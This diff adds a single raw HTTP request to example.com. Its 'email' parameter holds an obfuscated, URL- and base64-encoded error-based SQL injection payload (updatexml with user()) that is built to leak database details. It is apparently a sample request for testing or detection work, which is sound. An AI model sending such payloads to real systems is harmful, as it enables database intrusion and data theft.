@@ -1,0 +1,6 @@
+GET /index.php?email=%27%250bCHAR%2879%2C82%29/%2A%2A/CHAR%2870%2C82%2C79%2C77%29_BASE64%28%27IGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSx1c2VyKCkpLDEpLS0%3D%27%29--%3B%2509CHAR%2883%2C69%2C76%2C69%2C67%2C84%29%25091 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
